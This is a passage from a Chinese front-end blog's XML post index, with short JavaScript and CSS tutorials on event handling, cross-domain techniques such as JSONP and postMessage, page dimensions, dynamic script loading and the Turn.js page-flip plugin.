textarea::-moz-placeholder &#123; color:#666; &#125; input:-ms-input-placeholder, textarea:-ms-input-placeholder &#123; color:#666; &#125;知识点：单冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。css伪类：CSS 伪类用于向某些选择器添加特殊的效果。css伪元素：CSS 伪元素用于向某些选择器设置特殊效果。伪元素由双冒号和伪元素名称组成。双冒号是在当前规范中引入的，用于区分伪类和伪元素。但是伪类兼容现存样式，浏览器需要同时支持旧的伪类，如:first-line,:first-letter,:before,:after等等。因此对于css2之前已经有的伪元素两种写法的作用是一样的，但是为了兼容IE浏览器还是使用单冒号的写法。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>改变placeholder字的颜色</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript阻止事件冒泡的函数]]></title>
    <url>%2F2015%2F07%2F26%2Fjavascript%E9%98%BB%E6%AD%A2%E4%BA%8B%E4%BB%B6%E5%86%92%E6%B3%A1%E7%9A%84%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[兼容主流浏览器的阻止冒泡的方法：12345678function stopPropagation(e) &#123; e = e || window.event; if(e.stopPropagation) &#123; //W3C阻止冒泡方法 e.stopPropagation(); &#125; else &#123; e.cancelBubble = true; //IE阻止冒泡方法 &#125; &#125;调用：1234document.getElementById('btn_show').onclick = function(e) &#123; document.getElementById('need_hide').style.display = 'block'; stopPropagation(e); &#125;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js事件冒泡函数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[金额格式化，三位加个逗号]]></title>
    <url>%2F2015%2F07%2F26%2F%E9%87%91%E9%A2%9D%E6%A0%BC%E5%BC%8F%E5%8C%96%EF%BC%8C%E4%B8%89%E4%BD%8D%E5%8A%A0%E4%B8%AA%E9%80%97%E5%8F%B7%2F</url>
    <content type="text"><![CDATA[12345678910111213function addCommas(nStr)&#123; nStr += '';//改变成字符串 x = nStr.split('.'); x1 = x[0]; console.log(x.length) x2 = x.length &gt; 1 ? '.' + x[1] : ''; var rgx = /(\d+)(\d&#123;3&#125;)/; while (rgx.test(x1)) &#123; x1 = x1.replace(rgx, '$1' + ',' + '$2'); &#125; return x1 + x2;&#125;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>金额格式化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[监听json值变化并执行回调函数]]></title>
    <url>%2F2015%2F07%2F26%2F%E7%9B%91%E5%90%ACjson%E5%80%BC%E5%8F%98%E5%8C%96%E5%B9%B6%E6%89%A7%E8%A1%8C%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[用法：123456var obj = &#123;_name:"test"&#125;obj.bind("name",function()&#123;console.log("callback");&#125;)obj.name = "测试"; // 会触发bind方法12345678910111213141516if(!Object.prototype.bind)&#123; Object.prototype.bind = function(key, callback)&#123; var _key = "_" + key; Object.defineProperty(this, key, &#123; get: function()&#123; return this[_key]; &#125;, set: function(value)&#123; if(value !== this[_key])&#123; this[_key] = value; callback(); &#125; &#125; &#125;); &#125;&#125;&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>监听json值变化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript获取网页宽高方法汇总]]></title>
    <url>%2F2015%2F07%2F26%2Fjavascript%E8%8E%B7%E5%8F%96%E7%BD%91%E9%A1%B5%E5%AE%BD%E9%AB%98%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[document.body.clientWidth - 网页可见区域宽document.body.clientHeight - 网页可见区域高document.body.offsetWidth - 网页可见区域宽，包括边线和滚动条的宽document.body.offsetHeight - 网页可见区域高，包括边线和滚动条的高[FF,chrom下是整个页面高，IE opera 下正常]document.body.scrollWidth - 网页总宽document.body.scrollHeight - 网页总高document.body.scrollTop - 有滚动条的时候，向下拖动滚动条，上方不显示的那部分高度document.body.scrollLeft - 同上window.innerHeight - 浏览器窗口的内部高度window.innerWidth - 浏览器窗口的内部宽度window.screenTop - 网页正文部分上[网页文档的最上方距离屏幕最上方的距离，但FF不支持，Chrom,IE,Opera表现都不同，慎用]window.screenLeft - 网页正文部分左[网页文档的最左方距离屏幕最左方的距离，但FF不支持，Chrom,IE,Opera表现都不同，慎用]window.screen.height - 屏幕分辨率的高度window.screen.width - 屏幕分辨率的宽度window.screen.availHeight - 可用工作区高度[整个屏幕但不包括下方任务栏]window.screen.availWidth - 可用工作区宽度[整个屏幕的宽度]window.screen.clorDepth - 屏幕色彩，常用的16,32位等window.screen.deviceXDPI - 屏幕像素/英寸【IE支持，其它不支持】JavaScript 获取页面宽高的方法12345678910111213141516171819202122function getInfo() &#123; var s = ""; s += " 网页可见区域宽：" + document.body.clientWidth; s += " 网页可见区域高：" + document.body.clientHeight; s += " 网页可见区域宽：" + document.body.offsetWidth + " (包括边线和滚动条的宽)"; s += " 网页可见区域高：" + document.body.offsetHeight + " (包括边线的宽)"; s += " 网页正文全文宽：" + document.body.scrollWidth; s += " 网页正文全文高：" + document.body.scrollHeight; s += " 网页被卷去的高(ff)：" + document.body.scrollTop; s += " 网页被卷去的高(ie)：" + document.documentElement.scrollTop; s += " 网页被卷去的左：" + document.body.scrollLeft; s += " 网页正文部分上：" + window.screenTop; s += " 网页正文部分左：" + window.screenLeft; s += " 屏幕分辨率的高：" + window.screen.height; s += " 屏幕分辨率的宽：" + window.screen.width; s += " 屏幕可用工作区高度：" + window.screen.availHeight; s += " 屏幕可用工作区宽度：" + window.screen.availWidth; s += " 你的屏幕设置是 " + window.screen.colorDepth + " 位彩色"; s += " 你的屏幕设置 " + window.screen.deviceXDPI + " 像素/英寸"; alert(s);&#125;getInfo();在我本地测试当中：在IE、FireFox、Opera下都可以使用12document.body.clientWidthdocument.body.clientHeight即可获得，很简单，很方便。而在公司项目当中：Opera仍然使用12document.body.clientWidthdocument.body.clientHeight可是IE和FireFox则使用12document.documentElement.clientWidthdocument.documentElement.clientHeight原来是W3C的标准在作怪啊1&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;如果在页面中添加这行标记的话 在IE中：1234document.body.clientWidth ==&gt; BODY对象宽度document.body.clientHeight ==&gt; BODY对象高度document.documentElement.clientWidth ==&gt; 可见区域宽度document.documentElement.clientHeight ==&gt; 可见区域高度在FireFox中：1234document.body.clientWidth ==&gt; BODY对象宽度document.body.clientHeight ==&gt; BODY对象高度document.documentElement.clientWidth ==&gt; 可见区域宽度document.documentElement.clientHeight ==&gt; 可见区域高度在Opera中：123document.body.clientWidth ==&gt; 可见区域宽度document.body.clientHeight ==&gt; 可见区域高度document.documentElement.clientWidth ==&gt; 页面对象宽度（即BODY对象宽度加上Margin宽） document.documentElement.clientHeight ==&gt; 页面对象高度（即BODY对象高度加上Margin高）而如果没有定义W3C的标准，则IE为：12document.documentElement.clientWidth ==&gt; 0document.documentElement.clientHeight ==&gt; 0FireFox为：12document.documentElement.clientWidth ==&gt; 页面对象宽度（即BODY对象宽度加上Margin宽）document.documentElement.clientHeight ==&gt; 页面对象高度（即BODY对象高度加上Margin高）Opera为：12document.documentElement.clientWidth ==&gt; 页面对象宽度（即BODY对象宽度加上Margin宽）document.documentElement.clientHeight ==&gt; 页面对象高度（即BODY对象高度加上Margin高）&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js获取网页宽高</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js中跨域方法总结及原理详解]]></title>
    <url>%2F2015%2F07%2F26%2Fjs%E4%B8%AD%E8%B7%A8%E5%9F%9F%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%E5%8F%8A%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[框架中(iframe)的数据。只要协议、域名、端口有任何一个不同，都被当作是不同的域。下表给出了相对http://store.company.com/dir/page.html同源检测的结果:要解决跨域的问题，我们可以使用以下几种方法：一、通过jsonp跨域在js中，我们直接用XMLHttpRequest请求不同域上的数据时，是不可以的。但是，在页面上引入不同域上的js脚本文件却是可以的，jsonp正是利用这个特性来实现的。比如，有个a.html页面，它里面的代码需要利用ajax获取一个不同域上的json数据，假设这个json数据地址是http://example.com/data.php,那么a.html中的代码就可以这样：我们看到获取数据的地址后面还有一个callback参数，按惯例是用这个参数名，但是你用其他的也一样。当然如果获取数据的jsonp地址页面不是你自己能控制的，就得按照提供数据的那一方的规定格式来操作了。因为是当做一个js文件来引入的，所以http://example.com/data.php返回的必须是一个能执行的js文件，所以这个页面的php代码可能是这样的:最终那个页面输出的结果是:所以通过http://example.com/data.php?callback=dosomething得到的js文件，就是我们之前定义的dosomething函数,并且它的参数就是我们需要的json数据，这样我们就跨域获得了我们需要的数据。这样jsonp的原理就很清楚了，通过script标签引入一个js文件，这个js文件载入成功后会执行我们在url参数中指定的函数，并且会把我们需要的json数据作为参数传入。所以jsonp是需要服务器端的页面进行相应的配合的。知道jsonp跨域的原理后我们就可以用js动态生成script标签来进行跨域操作了，而不用特意的手动的书写那些script标签。如果你的页面使用jquery，那么通过它封装的方法就能很方便的来进行jsonp操作了。原理是一样的，只不过我们不需要手动的插入script标签以及定义回掉函数。jquery会自动生成一个全局函数来替换callback=?中的问号，之 后获取到数据后又会自动销毁，实际上就是起一个临时代理函数的作用。$.getJSON方法会自动判断是否跨域，不跨域的话，就调用普通的ajax方法； 跨域的话，则会以异步加载js文件的形式来调用jsonp的回调函数。&nbsp;二、通过修改document.domain来跨子域浏览器都有一个同源策略，其限制之一就是第一种方法中我们说的不能通过ajax的方法去请求不同源中的文档。 它的第二个限制是浏览器中不同域的框架之间是不能进行js的交互操作的。有一点需要说明，不同的框架之间（父子或同辈），是能够获取到彼此的window 对象的，但蛋疼的是你却不能使用获取到的window对象的属性和方法(html5中的postMessage方法是一个例外，还有些浏览器比如ie6也 可以使用top、parent等少数几个属性)，总之，你可以当做是只能获取到一个几乎无用的window对象。比如，有一个页面，它的地址是http://www.example.com/a.html ， 在这个页面里面有一个iframe，它的src是http://example.com/b.html, 很显然，这个页面与它里面的iframe框架是不同域的，所以我们是无法通过在页面中书写js代码来获取iframe中的东西的：这个时候，document.domain就可以派上用场了，我们只要把http://www.example.com/a.html 和 http://example.com/b.html这 两个页面的document.domain都设成相同的域名就可以了。但要注意的是，document.domain的设置是有限制的，我们只能把 document.domain设置成自身或更高一级的父域，且主域必须相同。例如：a.b.example.com 中某个文档的document.domain 可以设成a.b.example.com、b.example.com 、example.com中的任意一个，但是不可以设成 c.a.b.example.com,因为这是当前域的子域，也不可以设成baidu.com,因为主域已经不相同了。在页面 http://www.example.com/a.html 中设置document.domain:在页面 http://example.com/b.html 中也设置document.domain，而且这也是必须的，虽然这个文档的domain就是example.com,但是还是必须显示的设置document.domain的值：这样我们就可以通过js访问到iframe中的各种属性和对象了。不过如果你想在http://www.example.com/a.html 页面中通过ajax直接请求http://example.com/b.html 页面，即使你设置了相同的document.domain也还是不行的，所以修改document.domain的方法只适用于不同子域的框架间的交互。 如果你想通过ajax的方法去与不同子域的页面交互，除了使用jsonp的方法外，还可以用一个隐藏的iframe来做一个代理。原理就是让这个 iframe载入一个与你想要通过ajax获取数据的目标页面处在相同的域的页面，所以这个iframe中的页面是可以正常使用ajax去获取你要的数据 的，然后就是通过我们刚刚讲得修改document.domain的方法，让我们能通过js完全控制这个iframe，这样我们就可以让iframe去发 送ajax请求，然后收到的数据我们也可以获得了。#三、使用window.name来进行跨域window 对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页 面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。比如：有一个页面a.html,它里面有这样的代码：再看看b.html页面的代码：a.html页面载入后3秒，跳转到了b.html页面，结果为：我们看到在b.html页面上成功获取到了它的上一个页面a.html给window.name设置的值。如果在之后所有载入的页面都没对 window.name进行修改的话，那么所有这些页面获取到的window.name的值都是a.html页面设置的那个值。当然，如果有需要，其中的 任何一个页面都可以对window.name的值进行修改。注意，window.name的值只能是字符串的形式，这个字符串的大小最大能允许2M左右甚 至更大的一个容量，具体取决于不同的浏览器，但一般是够用了。上面的例子中，我们用到的页面a.html和b.html是处于同一个域的，但是即使a.html与b.html处于不同的域中，上述结论同样是适用的，这也正是利用window.name进行跨域的原理。下面就来看一看具体是怎么样通过window.name来跨域获取数据的。还是举例说明。比如有一个www.example.com/a.html页面,需要通过a.html页面里的js来获取另一个位于不同域上的页面www.cnblogs.com/data.html里的数据。data.html页面里的代码很简单，就是给当前的window.name设置一个a.html页面想要得到的数据值。data.html里的代码：那么在a.html页面中，我们怎么把data.html页面载入进来呢？显然我们不能直接在a.html页面中通过改变window.location来 载入data.html页面，因为我们想要即使a.html页面不跳转也能得到data.html里的数据。答案就是在a.html页面中使用一个隐藏的 iframe来充当一个中间人角色，由iframe去获取data.html的数据，然后a.html再去得到iframe获取到的数据。充当中间人的iframe想要获取到data.html的通过window.name设置的数据，只需要把这个iframe的src设为www.cnblogs.com/data.html就 行了。然后a.html想要得到iframe所获取到的数据，也就是想要得到iframe的window.name的值，还必须把这个iframe的 src设成跟a.html页面同一个域才行，不然根据前面讲的同源策略，a.html是不能访问到iframe里的window.name属性的。这就是 整个跨域过程。看下a.html页面的代码：上面的代码只是最简单的原理演示代码，你可以对使用js封装上面的过程，比如动态的创建iframe,动态的注册各种事件等等，当然为了安全，获取完数据后，还可以销毁作为代理的iframe。网上也有很多类似的现成代码，有兴趣的可以去找一下。通过window.name来进行跨域，就是这样子的。&nbsp;四、使用HTML5中新引进的window.postMessage方法来跨域传送数据window.postMessage(message,targetOrigin) 方法是html5新引进的特性，可以使用它来向其它的window对象发送消息，无论这个window对象是属于同源或不同源，目前IE8+、 FireFox、Chrome、Opera等浏览器都已经支持window.postMessage方法。调用postMessage 方法的window对象是指要接收消息的那一个window对象，该方法的第一个参数message为要发送的消息，类型只能为字符串；第二个参数 targetOrigin用来限定接收消息的那个window对象所在的域，如果不想限定域，可以使用通配符 * 。需要接收消息的window对象，可是通过监听自身的message事件来获取传过来的消息，消息内容储存在该事件对象的data属性中。上面所说的向其他window对象发送消息，其实就是指一个页面有几个框架的那种情况，因为每一个框架都有一个window对象。在讨论第二种方法的时候， 我们说过，不同域的框架间是可以获取到对方的window对象的，而且也可以使用window.postMessage这个方法。下面看一个简单的示例， 有两个页面我们运行a页面后得到的结果:我们看到b页面成功的收到了消息。使用postMessage来跨域传送数据还是比较直观和方便的，但是缺点是IE6、IE7不支持，所以用不用还得根据实际需要来决定。结语：除了以上几种方法外，还有flash、在服务器上设置代理页面等跨域方式，这里就不做介绍了。以上四种方法，可以根据项目的实际情况来进行选择应用，个人认为window.name的方法既不复杂，也能兼容到几乎所有浏览器，这真是极好的一种跨域方法。以上所述就是本文的全部内容了，希望大家能够喜欢。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js跨域原理</tag>
        <tag>js跨域方法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript文件加载管理简单实现方法]]></title>
    <url>%2F2015%2F07%2F26%2Fjavascript%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E7%AE%A1%E7%90%86%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[本文实例讲述了javascript文件加载管理简单实现方法。分享给大家供大家参考。具体如下：这里介绍超级简单的进行javascript的文件（模块）的加载管理，实现sea.js或者require.js核心功能，用一行&lt;script src=&quot;js/light/light.js&quot;&gt;&lt;/script&gt;加载所有的js文件。好了，废话不多说，直接上码！1234567891011121314151617//按照lightJs的顺序，让网页加载js文件： var lightJs = ["./js/light/pre/jquery-1.8.0.min.js", "./js/light/pre/jquery-lib.js", "./js/light/pre/less-1.4.2.min.js", "./js/lihgt/pre/util.js", "./js/xla.js", "./js/light/light_file.js"];var light;if (!light) light = &#123;&#125;;light.load = (function(lightJs) &#123; if (!lightJs) lightJs = []; var doc = document; var head = doc.head || doc.getElementsByTagName("head")[0] || doc.documentElement; for (var i = 0; i &lt; lightJs.length; i++) &#123; var path = lightJs[i]; var node = doc.createElement("script"); node.charset = "utf-8"; node.src = path; head.appendChild(node); &#125; return doc;&#125; (lightJs));&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js文件加载管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript实现动态导入js与css等静态资源文件的方法]]></title>
    <url>%2F2015%2F07%2F26%2Fjavascript%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E5%AF%BC%E5%85%A5js%E4%B8%8Ecss%E7%AD%89%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[这篇文章主要介绍了javascript实现动态导入js与css等静态资源文件的方法,基于回调函数实现该功能,具有一定参考借鉴价值,需要的朋友可以参考下。本文实例讲述了javascript实现动态导入js与css等静态资源文件的方法。分享给大家供大家参考。具体实现方法如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546/** * 动态导入静态资源文件js/css */var $import = function() &#123; return function(rId, res, callback) &#123; if (res &amp;amp;&amp;amp; 'string' == typeof res) &#123; if (rId) &#123; if ($($('#' + rId), $('head')).length &gt; 0) &#123; return; &#125; &#125; //加载资源文件 var sType = res.substring(res.lastIndexOf('.') + 1); // 支持js/css if (sType &amp;amp;&amp;amp; ('js' == sType || 'css' == sType)) &#123; var isScript = (sType == 'js'); var tag = isScript ? 'script': 'link'; var head = document.getElementsByTagName('head')[0]; // 创建节点 var linkScript = document.createElement(tag); linkScript.type = isScript ? 'text/javascript': 'text/css'; linkScript.charset = 'UTF-8'; if (!isScript) &#123; linkScript.rel = 'stylesheet'; &#125; isScript ? linkScript.src = res: linkScript.href = res; if (callback &amp;amp;&amp;amp; 'function' == typeof callback) &#123; if (linkScript.addEventListener) &#123; linkScript.addEventListener('load', function() &#123; callback.call(); &#125;, false); &#125; else if (linkScript.attachEvent) &#123; linkScript.attachEvent('onreadystatechange', function() &#123; var target = window.event.srcElement; if (target.readyState == 'complete') &#123; callback.call(); &#125; &#125;); &#125; &#125; head.appendChild(linkScript); &#125; &#125; &#125;;&#125; ();]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js动态引入css文件</tag>
        <tag>js动态引入js文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Js添加事件attachEvent和addEventListener的用法详解]]></title>
    <url>%2F2015%2F07%2F26%2Fjs%E6%B7%BB%E5%8A%A0%E4%BA%8B%E4%BB%B6attachevent%E5%92%8Caddeventlistener%E7%9A%84%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[attachEvent和addEventListener详解，开始了！一、基础篇先介绍 attachEvent：attachEvent方法可以动态的为网页内的元素添加一个事件，通常你想为某个按扭添加一个单击事件时．你都会在按扭内写上onclick=事件名称，使用attachEvent则不必这样做．你把写好的事件准备好，在需要的时候给元素绑定上再执行．而且attachEvent支持为某个元素绑定多个事件．执行顺序是，后绑定的先执行。那么我在什么时候使用该方法呢，当然在你需要时，不过如今的Web2.0追求的是分离式开发技术，也就是说你在网页内看不到一句JavaScript语句，却在该页中使用了大量JavaScript技术，这就是高手们所谓的分离式开发技术，让前端的显示和程序逻辑分离开来。如果想删除事件请使用detachEventattachEvent方法只支持IE浏览器．与其功能相同的指令是addEventListener,该指令支持FF等浏览器，并且是W3C标准具体请参看下面实例：语法：Element.attachEvent(Etype,EventName)返回值：[tag:return_value /]参数Element:要为该元素动态添加一个事件。Etype:指定事件类型．比如：onclick,onkeyup,onmousemove等。EventName:指定事件名称．也就是你写好的函数。attachEvent实例:123456789101112131415161718192021&lt;html&gt;&lt;head&gt;&lt;title&gt;attachEvent方法使用实例&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;input id="a" type="button" value="点我" /&gt;注意该按扭没有任何事件&lt;br/&gt;&lt;input id="b" type="button" value="点我绑定事件" onclick="att_Event()" /&gt;点击该按扭为上面的按扭添加一个事件．&lt;center&gt;&lt;h3&gt;重点提示:你可以尝试多次点击绑定事件，最上面的那个按扭就会绑定多个事件．比如你点击三次绑定．你再点击最上面的按扭，他就会执行三次弹出框．这就是我说的attachEvent方法支持为某个元素绑定多个事件．当然在实际开发中，你可以根据实际情况，来为他绑定多个不同的事件！&lt;script language="javascript"&gt;function att_Event()&#123;var a = document.getElementById("a");a.value = "点我有事件";a.attachEvent("onclick",Hello_ok);&#125;function Hello_ok()&#123;alert("您好，欢迎来到grycheng的博客！本博客的发展离不开您的支持，谢谢您光临！");&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;接下来：addEventListeneraddEventListener方法与attachEvent方法功能相同，但是addEventListener是W3C标准，而&gt;attachEvent非W3C标准，且只支持IE浏览器。虽然addEventListener属于标准方法，但依然无法在IE下运行，IE不支持该方法。addEventListener带有三个参数．必须设置，缺一不可。addEventListener可以为网页内某个元素动态绑定一个事件．事件类型可随意指定．如:click,mousemove,keyup等。通常你想为某个按扭添加一个单击事件时。你都会在按扭内写上onclick=事件名称，使用addEventListener则不必这样做。你把写好的事件准备好，在需要的时候给元素绑定上再执行。而且addEventListener支持为某个元素绑定多个事件，执行顺序是：先绑定的先执行。那么我在什么时候使用该方法呢，当然在你需要时，不过如今的Web2.0追求的是分离式开发技术，也就是说你在网页内看不到一句JavaScript语句，却在该页中使用了大量JavaScript技术，这就是高手们所谓的分离式开发技术，让前端的显示和程序逻辑分离开来。如果想删除事件请使用removeEventListener经过我测试该方法支持FireFox(火狐浏览器)，不支持IE，具体请参看下面实例。语法：Element.addEventListener(Etype,EventName,boole)返回值：[tag:return_value /]参数Element:要为该元素绑定一个事件，可以是任意的html元素。Etype：事件类型，比如：click,keyup,mousemove，注意使用addEventListener绑定事件时，设置参数事件类型时不必写on，否则会出错。EventName：要绑定事件的名称，也就是你写好的函数．boole：该参数是一个布尔值，false或true必须填写，false代表支持浏览器事件捕获功能，true代表支持浏览事件冒泡功能。123456789101112131415161718192021&lt;html&gt;&lt;head&gt;&lt;title&gt;addEventListener方法使用实例&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;input id="a" type="button" value="点我" /&gt;注意执行网页时该按扭并没有事件&lt;br/&gt;&lt;input id="b" type="button" value="点我绑定事件" onclick="add_Event()" /&gt;点击该按扭为上面的按扭绑定事件&lt;br/&gt;&lt;h3&gt;注意该实例必须在FireFox(火狐浏览器下运行).你可以根据实际情况，来为他绑定多个不同的事件！addEventListener与&lt;a href="http://hi.baidu.com/jiang_yy_jiang"&gt;attachevent&lt;/a&gt;不一样的是，该方法不可以把同一事件绑定多次，但支持把不同的事件绑定到一个元素．请使用非IE浏览器测试该例。&lt;/h3&gt;&lt;script language="javascript"&gt;function add_Event()&#123;var a = document.getElementById("a");a.value="点我有事件";a.addEventListener("click",Hello_ok,false);&#125;function Hello_ok()&#123;alert("您好！欢迎来到grycheng的博客！本博客的发展离不开您的支持，谢谢您光临！");&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;请注意说明哈！那个很重要，开发人员要注意细节！看了上面的你在想，这两个方法浏览器不兼容，咋办，当然！老办法咯！！先判断是IE还是火狐嘛，这个简单看下面代码：123456789101112131415&lt;script type="text/javascript"&gt;function att_Event() &#123;var a = document.getElementById("a");a.value = "点我有事件";if (document.all) &#123;//IEa.attachEvent("onclick", Hello_ok);&#125;else &#123;//FF,Chrome，Safaria.addEventListener("click", Hello_ok, false);&#125;&#125;function Hello_ok() &#123;alert("您好，我测试attachEvent时间方法！");&#125;&lt;/script&gt;二、进阶篇一般我们在JS中添加事件，是这样子的1obj.onclick=method这种绑定事件的方式，兼容主流浏览器,但如果一个元素上添加多次同一事件呢?123obj.onclick=method1;obj.onclick=method2;obj.onclick=method3;如果这样写,那么只有最后绑定的事件,这里是method3会被执行,这个时候我们就不能用onclick这样的写法了,主角改登场了,在IE中我们可以使用attachEvent方法1234//object.attachEvent(event,function);btn1Obj.attachEvent("onclick",method1);btn1Obj.attachEvent("onclick",method2);btn1Obj.attachEvent("onclick",method3);执行顺序为method1-&gt;method2-&gt;method3做前端开发工程师,最悲剧的某过于浏览器兼容问题了,上面有两种添加事件的方法,为了同一添加事件的方法,我们不得不再重新写一个通用的添加事件函数,幸亏再有前人帮我们做了这件事12345678910111213function addEvent(elm, evType, fn, useCapture) &#123;if (elm.addEventListener) &#123;elm.addEventListener(evType, fn, useCapture);//DOM2.0return true;&#125;else if (elm.attachEvent) &#123;var r = elm.attachEvent(‘on‘ + evType, fn);//IE5+return r;&#125;else &#123;elm['on' + evType] = fn;//DOM 0&#125;&#125;下面是Dean Edwards 的版本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455function addEvent(element, type, handler) &#123;//为每一个事件处理函数分派一个唯一的IDif (!handler.$$guid) handler.$$guid = addEvent.guid++;//为元素的事件类型创建一个哈希表if (!element.events) element.events = &#123;&#125;;//为每一个"元素/事件"对创建一个事件处理程序的哈希表var handlers = element.events[type];if (!handlers) &#123;handlers = element.events[type] = &#123;&#125;;//存储存在的事件处理函数(如果有)if (element["on" + type]) &#123;handlers[0] = element["on" + type];&#125;&#125;//将事件处理函数存入哈希表handlers[handler.$$guid] = handler;//指派一个全局的事件处理函数来做所有的工作element["on" + type] = handleEvent;&#125;;//用来创建唯一的ID的计数器addEvent.guid = 1;function removeEvent(element, type, handler) &#123;//从哈希表中删除事件处理函数if (element.events &amp;amp;&amp;amp; element.events[type]) &#123;delete element.events[type][handler.$$guid];&#125;&#125;;function handleEvent(event) &#123;var returnValue = true;//抓获事件对象(IE使用全局事件对象)event = event || fixEvent(window.event);//取得事件处理函数的哈希表的引用var handlers = this.events[event.type];//执行每一个处理函数for (var i in handlers) &#123;this.$$handleEvent = handlers[i];if (this.$$handleEvent(event) === false) &#123;returnValue = false;&#125;&#125;return returnValue;&#125;;//为IE的事件对象添加一些“缺失的”函数function fixEvent(event) &#123;//添加标准的W3C方法event.preventDefault = fixEvent.preventDefault;event.stopPropagation = fixEvent.stopPropagation;return event;&#125;;fixEvent.preventDefault = function() &#123;this.returnValue = false;&#125;;fixEvent.stopPropagation = function() &#123;this.cancelBubble = true;&#125;;功能非常强悍，解决IE的this指向问题，event总是作为第一个参数传入，跨浏览器就更不在话下。最后贡献一个HTML5工作组的版本：12345678910111213141516171819202122232425var addEvent=(function()&#123;if(document.addEventListener)&#123;return function(el,type,fn)&#123;if(el.length)&#123;for(var i=0;i&amp;amp;lt;el.length;i++)&#123;addEvent(el[i],type,fn);&#125;&#125;else&#123;el.addEventListener(type,fn,false);&#125;&#125;;&#125;else&#123;return function(el,type,fn)&#123;if(el.length)&#123;for(var i=0;i&amp;amp;lt;el.length;i++)&#123;addEvent(el[i],type,fn);&#125;&#125;else&#123;el.attachEvent(‘on‘+type,function()&#123;return fn.call(el,window.event);&#125;);&#125;&#125;;&#125;&#125;)();PS：IE的attachEvent和W3C标准的addEventListener绑定多个事件的执行顺序是不一样的！&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>addEventListener</tag>
        <tag>attachEvent</tag>
        <tag>attachEvent和addEventListener区别</tag>
        <tag>attachEvent和addEventListener用法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery轻量级的书本和杂志翻页效果插件Turn.js]]></title>
    <url>%2F2015%2F07%2F25%2Fjquery%E8%BD%BB%E9%87%8F%E7%BA%A7%E7%9A%84%E4%B9%A6%E6%9C%AC%E5%92%8C%E6%9D%82%E5%BF%97%E7%BF%BB%E9%A1%B5%E6%95%88%E6%9E%9C%E6%8F%92%E4%BB%B6turn-js%2F</url>
    <content type="text"><![CDATA[&lt;效果很炫的jQuery轻量级的书本和杂志翻页效果插件Turn.js，支持移动触摸屏设备，采用硬件加速看起来更自然平滑，带有强大的选项配置功能以及两种切换效果，支持Ajax数据加载，浏览器支持：Safari 5、Chrome 16、Firefox 10、IE 10, 9, 8，基于jQuery 1.7及以上，还是很不错的，值得使用使用方法：1.加载jQuer和插件123456789101112131415&lt;script type="text/javascript" src="http://code.jquery.com/jquery-1.7.1.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/turn.min.js"&gt;&lt;/script&gt;&lt;style type="text/css"&gt;body&#123; background:#ccc;&#125;#magazine&#123; width:1152px; height:752px;&#125;#magazine .turn-page&#123; background-color:#ccc; background-size:100% 100%;&#125;&lt;/style&gt;2.HTML内容12345678&lt;div id="magazine"&gt;&lt;div style="background-image:url(pages/01.jpg);"&gt;&lt;/div&gt;&lt;div style="background-image:url(pages/02.jpg);"&gt;&lt;/div&gt;&lt;div style="background-image:url(pages/03.jpg);"&gt;&lt;/div&gt;&lt;div style="background-image:url(pages/04.jpg);"&gt;&lt;/div&gt;&lt;div style="background-image:url(pages/05.jpg);"&gt;&lt;/div&gt;&lt;div style="background-image:url(pages/06.jpg);"&gt;&lt;/div&gt;&lt;/div&gt;3.函数调用12345678910111213141516171819202122232425&lt;script type="text/javascript"&gt; $(window).ready(function() &#123; $('#magazine').turn(&#123; display: 'double', acceleration: true, gradients: !$.isTouch, elevation:50, when: &#123; turned: function(e, page) &#123; /*console.log('Current view: ', 